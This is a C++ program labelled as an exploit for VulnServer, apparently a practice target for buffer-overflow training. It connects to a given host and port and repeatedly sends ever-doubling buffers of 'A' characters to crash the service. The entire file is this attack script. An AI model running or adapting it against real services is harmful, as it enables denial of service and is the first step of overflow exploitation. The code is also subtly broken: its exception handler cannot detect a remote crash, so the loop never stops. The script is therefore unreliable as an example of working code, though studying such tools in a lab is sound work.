//Exploit for VulnServer Made by Gremlin
#include "includes.h"

void main(int argc, char** argv) {
	if (argc < 2) {
		printf("[+] Usage : FileName.exe [IP] [PORT (Default = 9999)]");
		return;
	}
#if defined(_WIN32)
	WSADATA d;
	if (WSAStartup(MAKEWORD(2, 2), &d)) {
		printf("[-] Failed to initialize socket !");
		return;
	}
#endif
	printf("[+] Configuring remote address...\n");
	struct addrinfo hints;
	memset(&hints, 0, sizeof(hints));
	hints.ai_socktype = SOCK_STREAM;
	struct addrinfo* peer_address;
	if (getaddrinfo(argv[1], argv[2] ? argv[2] : "9999", &hints, &peer_address)) {
		printf("[-] getaddrinfo failed !");
		return;
	}
	char address_buffer[100];
	char service_buffer[100];
	getnameinfo(peer_address->ai_addr, peer_address->ai_addrlen, address_buffer, sizeof(address_buffer), service_buffer, sizeof(service_buffer), NI_NUMERICHOST);
	printf("[+] Remote address is : %s\n", address_buffer);
	printf("[+] Remote service is : %s\n", service_buffer);
	//Socket Creation

	printf("[+] Creating socket...\n");
	SOCKET socket_peer;
	socket_peer = socket(peer_address->ai_family, peer_address->ai_socktype, peer_address->ai_protocol);
	if (!ISVALIDSOCKET(socket_peer)) {
		printf("[-] Socket failed !\n");
		return;
	}
	printf("[+] Connecting...\n");
	if (connect(socket_peer, peer_address->ai_addr, peer_address->ai_addrlen)) {
		printf("[-] Connection to target is impossible !\n");
		return;
	}
	freeaddrinfo(peer_address);
	char buffer[] = "A";
	int exploitBytes;
	size_t bufferMultiplier = 500;
	while (true) {
		try {
			char buffer = 'A';
			std::string exploitBuffer(bufferMultiplier, buffer);
			char* exploits = new char[exploitBuffer.size() + 1];
			std::copy(exploitBuffer.begin(), exploitBuffer.end(), exploits);
			exploits[exploitBuffer.size()] = '\0';
			exploitBytes = send(socket_peer, exploits, exploitBuffer.size() + 1, 0);
			printf("[+] Sent %d bytes to %s %s\n", exploitBytes, address_buffer, service_buffer);
			bufferMultiplier = bufferMultiplier + bufferMultiplier; //bufferMultiplier * 2
			delete[] exploits;
		}
		catch (std::exception& e) {
			printf("[+] Target crashed at %d bytes !", bufferMultiplier);
		}
	}
}
